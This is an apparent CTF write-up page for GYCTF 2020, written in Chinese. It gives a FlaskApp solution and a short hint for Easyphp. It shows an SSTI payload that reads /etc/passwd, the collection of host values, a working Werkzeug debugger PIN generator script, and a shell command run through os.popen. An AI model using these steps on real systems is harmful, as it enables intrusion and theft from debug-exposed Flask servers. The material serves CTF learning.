
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>GYCTF 2020 · Eki's CTF</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="Eki">
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-katex/katex.min.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-multipart/multipart.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-advanced-emoji/emoji-website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-pageview-count/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-code/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-auto-scroll-table/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="bjd-2nd.html" />
    
    
    <link rel="prev" href="fbctf-2019.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    
    
        
        <li>
            <a href="https://ieki.xyz" target="_blank" class="custom-link">主站 Eki's Blog</a>
        </li>
    
    

    
    <li class="divider"></li>
    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    About
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../library/">
            
                <a href="../library/">
            
                    
                    Library
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../library/steganography.html">
            
                <a href="../library/steganography.html">
            
                    
                    Steganography
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../library/gdb-tutorial.html">
            
                <a href="../library/gdb-tutorial.html">
            
                    
                    GDB Tutorial
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3" data-path="../library/sqli.html">
            
                <a href="../library/sqli.html">
            
                    
                    SQL Inject
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4" >
            
                <span>
            
                    
                    PHP
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.4.1" data-path="../library/php/function.html">
            
                <a href="../library/php/function.html">
            
                    
                    Functions
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.2" data-path="../library/php/protocol.html">
            
                <a href="../library/php/protocol.html">
            
                    
                    Protocol
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.3" data-path="../library/php/ace.html">
            
                <a href="../library/php/ace.html">
            
                    
                    ACE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.4" data-path="../library/php/serialize.html">
            
                <a href="../library/php/serialize.html">
            
                    
                    Serialize
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.5" data-path="../library/php/misc.html">
            
                <a href="../library/php/misc.html">
            
                    
                    Misc
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.5" data-path="../library/htaccess.html">
            
                <a href="../library/htaccess.html">
            
                    
                    Apache .htaccess
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.6" data-path="../library/ssti.html">
            
                <a href="../library/ssti.html">
            
                    
                    SSTI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.7" data-path="../library/ssrf.html">
            
                <a href="../library/ssrf.html">
            
                    
                    SSRF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.8" data-path="../library/xxe.html">
            
                <a href="../library/xxe.html">
            
                    
                    XXE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.9" data-path="../library/xss.html">
            
                <a href="../library/xss.html">
            
                    
                    XSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.10" data-path="../library/shell.html">
            
                <a href="../library/shell.html">
            
                    
                    Shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.11" data-path="../library/crypto.html">
            
                <a href="../library/crypto.html">
            
                    
                    Crypto
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.12" data-path="../library/js.html">
            
                <a href="../library/js.html">
            
                    
                    JavaScript
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.13" data-path="../library/python.html">
            
                <a href="../library/python.html">
            
                    
                    Python
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.14" data-path="../library/bash.html">
            
                <a href="../library/bash.html">
            
                    
                    BASH
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.15" data-path="../library/forensics.html">
            
                <a href="../library/forensics.html">
            
                    
                    Forensics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.16" data-path="../library/pentest.html">
            
                <a href="../library/pentest.html">
            
                    
                    Pentest
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.17" data-path="../library/protocol.html">
            
                <a href="../library/protocol.html">
            
                    
                    Protocol
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.18" data-path="../library/misc.html">
            
                <a href="../library/misc.html">
            
                    
                    MISC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.19" data-path="../library/awd.html">
            
                <a href="../library/awd.html">
            
                    
                    AWD
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../contest/">
            
                <a href="../contest/">
            
                    
                    Contest
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../contest/hfctf-2021.html">
            
                <a href="../contest/hfctf-2021.html">
            
                    
                    2021数字中国创新大赛虎符网络安全赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../contest/hackergame-2019.html">
            
                <a href="../contest/hackergame-2019.html">
            
                    
                    Hackergame 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="../contest/tsctf-j2019.html">
            
                <a href="../contest/tsctf-j2019.html">
            
                    
                    TSCTF-J 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="../contest/nctf2019.html">
            
                <a href="../contest/nctf2019.html">
            
                    
                    NCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.5" data-path="../contest/isoon-2019.html">
            
                <a href="../contest/isoon-2019.html">
            
                    
                    ISOON 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.6" data-path="../contest/mrctf-2020.html">
            
                <a href="../contest/mrctf-2020.html">
            
                    
                    MRCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.7" data-path="../contest/hfctf-2020.html">
            
                <a href="../contest/hfctf-2020.html">
            
                    
                    2020数字中国创新大赛虎符网络安全赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.8" data-path="../contest/npuctf-2020.html">
            
                <a href="../contest/npuctf-2020.html">
            
                    
                    NPUCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.9" data-path="../contest/gkctf-2020.html">
            
                <a href="../contest/gkctf-2020.html">
            
                    
                    GKCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.10" data-path="../contest/sctf-2020.html">
            
                <a href="../contest/sctf-2020.html">
            
                    
                    SCTF 2020
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../adworld/">
            
                <a href="../adworld/">
            
                    
                    ADworld
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../adworld/misc-exercise-area.html">
            
                <a href="../adworld/misc-exercise-area.html">
            
                    
                    Misc Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="../adworld/crypto-execrise-area.html">
            
                <a href="../adworld/crypto-execrise-area.html">
            
                    
                    Crypto Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="../adworld/web-execrise-area.html">
            
                <a href="../adworld/web-execrise-area.html">
            
                    
                    Web Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4" data-path="../adworld/pwn-exercise-area.html">
            
                <a href="../adworld/pwn-exercise-area.html">
            
                    
                    PWN Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.5" data-path="../adworld/reverse-execrise-area.html">
            
                <a href="../adworld/reverse-execrise-area.html">
            
                    
                    Reverse Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.6" data-path="../adworld/easy_tornado.html">
            
                <a href="../adworld/easy_tornado.html">
            
                    
                    Easy Tornado
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.7" data-path="../adworld/i-got-id-200.html">
            
                <a href="../adworld/i-got-id-200.html">
            
                    
                    i-got-id-200
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.8" data-path="../adworld/ics-02.html">
            
                <a href="../adworld/ics-02.html">
            
                    
                    ics-02
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.9" data-path="../adworld/ics-07.html">
            
                <a href="../adworld/ics-07.html">
            
                    
                    ics-07
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.10" data-path="../adworld/shrine.html">
            
                <a href="../adworld/shrine.html">
            
                    
                    shrine
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.11" data-path="../adworld/super_sqli.html">
            
                <a href="../adworld/super_sqli.html">
            
                    
                    super_sqli
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.12" data-path="../adworld/web_php_unserialize.html">
            
                <a href="../adworld/web_php_unserialize.html">
            
                    
                    Web_php_unserialize
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.13" data-path="../adworld/web_php_wrong_nginx_config.html">
            
                <a href="../adworld/web_php_wrong_nginx_config.html">
            
                    
                    web_php_wrong_nginx_config
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.14" data-path="../adworld/web_python_template_injection.html">
            
                <a href="../adworld/web_python_template_injection.html">
            
                    
                    Web_python_template_injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.15" data-path="../adworld/wtf.sh-150.html">
            
                <a href="../adworld/wtf.sh-150.html">
            
                    
                    wtf.sh-150
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.16" data-path="../adworld/zhuanxv.html">
            
                <a href="../adworld/zhuanxv.html">
            
                    
                    Zhuanxv
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="./">
            
                <a href="./">
            
                    
                    BUUOJ
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="suctf-2019.html">
            
                <a href="suctf-2019.html">
            
                    
                    SUCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="ciscn-northeast-2019.html">
            
                <a href="ciscn-northeast-2019.html">
            
                    
                    CISCN 2019 华北赛区
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="ciscn-pre-2019.html">
            
                <a href="ciscn-pre-2019.html">
            
                    
                    CISCN 2019 初赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4" data-path="ciscn-final-2019.html">
            
                <a href="ciscn-final-2019.html">
            
                    
                    CISCN 2019 Final
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5" data-path="de1ctf-2019.html">
            
                <a href="de1ctf-2019.html">
            
                    
                    De1CTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6" data-path="wangdingcup-2018.html">
            
                <a href="wangdingcup-2018.html">
            
                    
                    网鼎杯 2018
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.7" data-path="wangdingcup-2019.html">
            
                <a href="wangdingcup-2019.html">
            
                    
                    网鼎杯 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.8" data-path="roarctf-2019.html">
            
                <a href="roarctf-2019.html">
            
                    
                    RoarCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.9" data-path="0ctf-2016.html">
            
                <a href="0ctf-2016.html">
            
                    
                    0CTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.10" data-path="gxyctf-2019.html">
            
                <a href="gxyctf-2019.html">
            
                    
                    GXYCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.11" data-path="hitcon-2017.html">
            
                <a href="hitcon-2017.html">
            
                    
                    Hitcon 2017
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.12" data-path="jikedatiaozhan-2019.html">
            
                <a href="jikedatiaozhan-2019.html">
            
                    
                    极客大挑战2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.13" data-path="lctf-2018.html">
            
                <a href="lctf-2018.html">
            
                    
                    LCTF 2018
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.14" data-path="de1ctf-2019.html">
            
                <a href="de1ctf-2019.html">
            
                    
                    De1CTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.15" data-path="swpu-2019.html">
            
                <a href="swpu-2019.html">
            
                    
                    SWPU 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.16" data-path="suctf-2019.html">
            
                <a href="suctf-2019.html">
            
                    
                    SUCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.17" data-path="bjdctf-2020.html">
            
                <a href="bjdctf-2020.html">
            
                    
                    BJDCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.18" data-path="rctf-2015.html">
            
                <a href="rctf-2015.html">
            
                    
                    RCTF 2015
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.19" data-path="bytectf-2019.html">
            
                <a href="bytectf-2019.html">
            
                    
                    ByteCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.20" data-path="qiangwangbei-2019.html">
            
                <a href="qiangwangbei-2019.html">
            
                    
                    强网杯 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.21" data-path="ddctf-2019.html">
            
                <a href="ddctf-2019.html">
            
                    
                    DDCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.22" data-path="eis-2019.html">
            
                <a href="eis-2019.html">
            
                    
                    EIS 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.23" data-path="vn-2020.html">
            
                <a href="vn-2020.html">
            
                    
                    V&N 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.24" data-path="fbctf-2019.html">
            
                <a href="fbctf-2019.html">
            
                    
                    FBCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.5.25" data-path="gyctf-2020.html">
            
                <a href="gyctf-2020.html">
            
                    
                    GYCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.26" data-path="bjd-2nd.html">
            
                <a href="bjd-2nd.html">
            
                    
                    BJDCTF 2nd
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.27" data-path="fireshellctf-2020.html">
            
                <a href="fireshellctf-2020.html">
            
                    
                    FireShellCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.5.28" data-path="gyctf-2020.html">
            
                <a href="gyctf-2020.html">
            
                    
                    GWCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.29" data-path="watevrctf-2019.html">
            
                <a href="watevrctf-2019.html">
            
                    
                    WatervrCTF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.30" data-path="ciscn-southeast-2019.html">
            
                <a href="ciscn-southeast-2019.html">
            
                    
                    CISCN2019 华东南赛区
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.31" data-path="bsidescf-2019.html">
            
                <a href="bsidescf-2019.html">
            
                    
                    BsidesCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.32" data-path="rctf-2019.html">
            
                <a href="rctf-2019.html">
            
                    
                    RCTF 2019
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="../pwnable.kr/">
            
                <a href="../pwnable.kr/">
            
                    
                    pwnable.kr
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.6.1" data-path="../pwnable.kr/toddlers-bottle.html">
            
                <a href="../pwnable.kr/toddlers-bottle.html">
            
                    
                    Toddler's Bottle
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../ethernaut/">
            
                <a href="../ethernaut/">
            
                    
                    Ethernaut
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8" data-path="../vulnhub/">
            
                <a href="../vulnhub/">
            
                    
                    Vulnhub
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.1" data-path="../vulnhub/dc-9.html">
            
                <a href="../vulnhub/dc-9.html">
            
                    
                    DC-9
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.2" data-path="../vulnhub/five86-1.html">
            
                <a href="../vulnhub/five86-1.html">
            
                    
                    five86-1
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.3" data-path="../vulnhub/wakanda.html">
            
                <a href="../vulnhub/wakanda.html">
            
                    
                    wakanda
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >GYCTF 2020</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#gyctf-2020"><b></b>GYCTF 2020</a></li><ul><li><span class="title-icon "></span><a href="#flaskapp"><b></b>FlaskApp</a></li><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;&#x8D44;&#x6599;"><b></b>&#x53C2;&#x8003;&#x8D44;&#x6599;</a></li><li><span class="title-icon "></span><a href="#easyphp"><b></b>Easyphp</a></li><li><span class="title-icon "></span><a href="#ezexpress"><b></b>Ez_Express</a></li><ul><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;&#x8D44;&#x6599;_1"><b></b>&#x53C2;&#x8003;&#x8D44;&#x6599;</a></li></ul><li><span class="title-icon "></span><a href="#node-game"><b></b>Node Game</a></li><li><span class="title-icon "></span><a href="#easythinking"><b></b>EasyThinking</a></li><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;&#x8D44;&#x6599;_2"><b></b>&#x53C2;&#x8003;&#x8D44;&#x6599;</a></li></ul></ul></div><a href="#gyctf-2020" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="gyctf-2020"><a name="gyctf-2020" class="anchor-navigation-ex-anchor" href="#gyctf-2020"><i class="fa fa-link" aria-hidden="true"></i></a>GYCTF 2020</h1>
<h2 id="flaskapp"><a name="flaskapp" class="anchor-navigation-ex-anchor" href="#flaskapp"><i class="fa fa-link" aria-hidden="true"></i></a>FlaskApp</h2>
<p>&#x8FDB;&#x5165;&#x662F;&#x4E2A;Flask&#x7684;base64&#x52A0;&#x5BC6;&#x89E3;&#x5BC6;&#x9875;&#x9762;</p>
<p>&#x8003;&#x8651;SSTI&#x54AF;</p>
<p>&#x8BD5;&#x4E86;&#x4E00;&#x4E0B;<code>base64decode(base64encode({{1+1}}))</code>&#x4F1A;&#x8FD4;&#x56DE;2</p>
<p>&#x7136;&#x540E;&#x5C31;&#x5F00;&#x59CB;&#x627E;</p>
<pre><code class="lang-python">{{().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">0</span>].__init__}}
`
</code></pre>
<p>&#x54EA;&#x4E2A;&#x88AB;&#x91CD;&#x8F7D;&#x53D1;&#x73B0;75&#x53EF;&#x4EE5;&#x7528;</p>
<pre><code>&#x7ED3;&#x679C; &#xFF1A; &amp;lt;function _ModuleLock.__init__ at 0x7f070fc12290&amp;gt;
</code></pre><p>&#x7136;&#x540E;&#x5C31;&#x662F;<code>__globals__.__builtins__[]</code></p>
<p>&#x53D1;&#x73B0;eval&#x4E0D;&#x80FD;&#x7528;,&#x7528;open&#x53EF;&#x4EE5;&#x8BFB;,&#x4F46;&#x662F;&#x4F3C;&#x4E4E;flag&#x4E5F;&#x88AB;&#x8FC7;&#x6EE4;&#x4E86;&#xFF0C;</p>
<pre><code class="lang-python">{{().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">75</span>].__init__.__globals__.__builtins__[<span class="hljs-string">&apos;open&apos;</span>](<span class="hljs-string">&quot;/etc/passwd&quot;</span>).read()}}
</code></pre>
<p>&#x8FD9;&#x4E2A;&#x65F6;&#x5019;&#x4E5F;&#x53D1;&#x73B0;&#x5B58;&#x5728;&#x62A5;&#x9519;&#x754C;&#x9762;&#xFF0C;&#x63D0;&#x793A;&#x4E86;&#x662F;&#x5728;&#x8C03;&#x8BD5;&#x6A21;&#x5F0F;&#xFF0C;&#x8003;&#x8651;&#x62FF;Flask&#x7684;PIN</p>
<p>&#x9700;&#x8981;&#x62FF;&#x5230;&#xFF1A;</p>
<blockquote>
<p>username:&#x5C31;&#x662F;&#x542F;&#x52A8;&#x8FD9;&#x4E2A;Flask&#x7684;&#x7528;&#x6237;</p>
<p>modname&#x4E3A;flask.app</p>
<p>getattr(app, &apos;<strong>name</strong>&apos;, getattr(app.<strong>class</strong>, &apos;<strong>name</strong>&apos;))&#x4E3A;Flask</p>
<p>getattr(mod, &apos;<strong>file</strong>&apos;, None)&#x4E3A;flask&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x4E00;&#x4E2A;app.py&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;</p>
<p>uuid.getnode()&#x5C31;&#x662F;&#x5F53;&#x524D;&#x7535;&#x8111;&#x7684;MAC&#x5730;&#x5740;&#xFF0C;str(uuid.getnode())&#x5219;&#x662F;mac&#x5730;&#x5740;&#x7684;&#x5341;&#x8FDB;&#x5236;&#x8868;&#x8FBE;&#x5F0F;</p>
<p>get_machine_id() /etc/machine-id&#x6216;&#x8005; /proc/sys/kernel/random/boot_i&#x4E2D;&#x7684;&#x503C;</p>
<p>&#x5047;&#x5982;&#x662F;&#x5728;win&#x5E73;&#x53F0;&#x4E0B;&#x8BFB;&#x53D6;&#x4E0D;&#x5230;&#x4E0A;&#x9762;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x5C31;&#x53BB;&#x83B7;&#x53D6;&#x6CE8;&#x518C;&#x8868;&#x4E2D;SOFTWARE\Microsoft\Cryptography&#x7684;&#x503C;
&#x5047;&#x5982;&#x662F;Docker&#x673A; &#x90A3;&#x4E48;&#x4E3A; /proc/self/cgroup docker&#x884C;</p>
</blockquote>
<p>&#x901A;&#x8FC7;<code>open().read()</code>&#x62FF;&#x5230;&#x8FD9;&#x4E9B;&#x503C;</p>
<pre><code>username: flaskweb // /etc/passwd
modname: flask.app
getattr(app, &apos;__name__&apos;, getattr(app.__class__, &apos;__name__&apos;)):Flask
getattr(mod, &apos;__file__&apos;, None): /usr/local/lib/python3.7/site-packages/flask/app.py //&#x62A5;&#x9519;&#x4FE1;&#x606F;
uuid.getnode():  str(02:42:ae:01:17:04)=2485410404100 // /sys/class/net/eth0/address
get_machine_id(): b7372b2e7d533d8845c8f8d5aa5086ad9f8d5e16693d990ffe49ed4f55c190fd // /proc/self/cgroup
</code></pre><p>&#x8DD1;&#x811A;&#x672C;</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain
probably_public_bits = [
    <span class="hljs-string">&apos;flaskweb&apos;</span>,
    <span class="hljs-string">&apos;flask.app&apos;</span>,
    <span class="hljs-string">&apos;Flask&apos;</span>,
    <span class="hljs-string">&apos;/usr/local/lib/python3.7/site-packages/flask/app.py&apos;</span>,
]

private_bits = [
    <span class="hljs-string">&apos;2485410404100&apos;</span>,
    <span class="hljs-string">&apos;b7372b2e7d533d8845c8f8d5aa5086ad9f8d5e16693d990ffe49ed4f55c190fd&apos;</span>
]

h = hashlib.md5()
<span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:
        <span class="hljs-keyword">continue</span>
    <span class="hljs-keyword">if</span> isinstance(bit, str):
        bit = bit.encode(<span class="hljs-string">&apos;utf-8&apos;</span>)
    h.update(bit)
h.update(<span class="hljs-string">b&apos;cookiesalt&apos;</span>)

cookie_name = <span class="hljs-string">&apos;__wzd&apos;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]

num = <span class="hljs-keyword">None</span>
<span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:
    h.update(<span class="hljs-string">b&apos;pinsalt&apos;</span>)
    num = (<span class="hljs-string">&apos;%09d&apos;</span> % int(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]

rv =<span class="hljs-keyword">None</span>
<span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:
    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:
        <span class="hljs-keyword">if</span> len(num) % group_size == <span class="hljs-number">0</span>:
            rv = <span class="hljs-string">&apos;-&apos;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&apos;0&apos;</span>)
                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(num), group_size))
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">else</span>:
        rv = num

print(rv)
</code></pre>
<p>&#x7136;&#x540E;&#x5728;&#x62A5;&#x9519;&#x754C;&#x9762;&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x4E86;</p>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> os
os.popen(<span class="hljs-string">&quot;ls /&quot;</span>).read()
</code></pre>
<h2 id="&#x53C2;&#x8003;&#x8D44;&#x6599;"><a name="&#x53C2;&#x8003;&#x8D44;&#x6599;" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;&#x8D44;&#x6599;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53C2;&#x8003;&#x8D44;&#x6599;</h2>
<p>Flask debug pin&#x5B89;&#x5168;&#x95EE;&#x9898;&#xFF1A;</p>
<p><a href="https://xz.aliyun.com/t/2553" target="_blank">https://xz.aliyun.com/t/2553</a></p>
<h2 id="easyphp"><a name="easyphp" class="anchor-navigation-ex-anchor" href="#easyphp"><i class="fa fa-link" aria-hidden="true"></i></a>Easyphp</h2>
<p>&#x626B;&#x76EE;&#x5F55;&#x53EF;&#x4EE5;&#x626B;&#x51FA;&#x6E90;&#x7801;<code>www.zip</code></p>
<p>&#x8003;&#x5BDF;POP&#x94FE;+&#x5C3E;&#x90E8;&#x9003;&#x9038;</p>
